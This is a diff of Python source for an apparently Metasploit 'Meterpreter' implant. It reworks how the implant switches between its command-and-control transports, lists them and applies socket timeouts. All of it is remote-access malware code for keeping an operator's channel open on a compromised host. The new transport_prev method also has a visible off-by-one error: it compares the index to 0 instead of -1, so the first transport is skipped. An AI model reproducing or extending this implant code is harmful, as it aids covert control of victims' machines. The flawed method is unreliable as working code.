@@ -546,7 +546,7 @@ class TcpTransport(Transport):
 
 	def _get_packet(self):
 		packet = None
-		if len(select.select([self.socket], [], [], 0.5)[0]):
+		if select.select([self.socket], [], [], self.communication_timeout)[0]:
 			packet = self.socket.recv(8)
 			if len(packet) != 8:
 				return None
@@ -573,7 +573,7 @@ class TcpTransport(Transport):
 			url = 'tcp6://'
 		address, port = sock.getsockname()[:2]
 		# this will need to be changed if the bind stager ever supports binding to a specific address
-		if not (address == '0.0.0.0' or address == '::'):
+		if not address in ('', '0.0.0.0', '::'):
 			address, port = sock.getpeername()[:2]
 		url += address + ':' + str(port)
 		url = url
@@ -638,17 +638,28 @@ class PythonMeterpreter(object):
 	def session_has_expired(self):
 		return time.time() > self.session_expiry_end
 
-	def change_transport(self, forward=True):
-		current_idx = self.transports.index(self.transport)
-		if forward:
-			new_idx = min(current_idx + 1, len(self.transports) - 1)
-		else:
-			new_idx = max(current_idx - 1, 0)
-		if new_idx == current_idx:
+	def transport_change(self, new_transport):
+		if new_transport == self.transport:
 			return
 		self.transport.deactivate()
-		self.transport = self.transports[new_idx]
-		self.transport.activate()
+		new_transport.activate()
+		self.transport = new_transport
+
+	def transport_next(self, current_transport=None):
+		if current_transport is None:
+			current_transport = self.transport
+		new_idx = self.transports.index(current_transport) + 1
+		if new_idx == len(self.transports):
+			new_idx = 0
+		return self.transports[new_idx]
+
+	def transport_prev(self, current_transport=None):
+		if current_transport is None:
+			current_transport = self.transport
+		new_idx = self.transports.index(current_transport) - 1
+		if new_idx == 0:
+			new_idx = len(self.transports) - 1
+		return self.transports[new_idx]
 
 	def run(self):
 		while self.running and not self.session_has_expired:
@@ -676,7 +687,7 @@ class PythonMeterpreter(object):
 						elif channel.poll() != None:
 							self.handle_dead_resource_channel(channel_id)
 					elif isinstance(channel, MeterpreterSocketClient):
-						while len(select.select([channel.fileno()], [], [], 0)[0]):
+						while select.select([channel.fileno()], [], [], 0)[0]:
 							try:
 								d = channel.recv(1)
 							except socket.error:
@@ -686,7 +697,7 @@ class PythonMeterpreter(object):
 								break
 							data += d
 					elif isinstance(channel, MeterpreterSocketServer):
-						if len(select.select([channel.fileno()], [], [], 0)[0]):
+						if select.select([channel.fileno()], [], [], 0)[0]:
 							(client_sock, client_addr) = channel.accept()
 							server_addr = channel.getsockname()
 							client_channel_id = self.add_channel(MeterpreterSocketClient(client_sock))
@@ -788,22 +799,29 @@ class PythonMeterpreter(object):
 		return ERROR_SUCCESS, response
 
 	def _core_transport_change(self, request, response):
-		raise NotImplemented()
+		new_transport = Transport.from_request(request)
+		self.send_packet(tlv_pack_response(ERROR_SUCCESS, response))
+		self.transport_change(new_transport)
+		return None
 
 	def _core_transport_list(self, request, response):
 		response += tlv_pack(TLV_TYPE_TRANS_SESSION_EXP, self.session_expiry_end - time.time())
-		for transport in self.transports:
+		response += tlv_pack(TLV_TYPE_TRANS_GROUP, self.transport.tlv_pack_transport_group())
+
+		transport = self.transport_next()
+		while transport != self.transport:
 			response += tlv_pack(TLV_TYPE_TRANS_GROUP, transport.tlv_pack_transport_group())
+			transport = self.transport_next(transport)
 		return ERROR_SUCCESS, response
 
 	def _core_transport_next(self, request, response):
 		self.send_packet(tlv_pack_response(ERROR_SUCCESS, response))
-		self.change_transport(forward=True)
+		self.transport_change(self.transport_next())
 		return None
 
 	def _core_transport_prev(self, request, response):
 		self.send_packet(tlv_pack_response(ERROR_SUCCESS, response))
-		self.change_transport(forward=False)
+		self.transport_change(self.transport_prev())
 		return None
 
 	def _core_transport_set_timeouts(self, request, response):
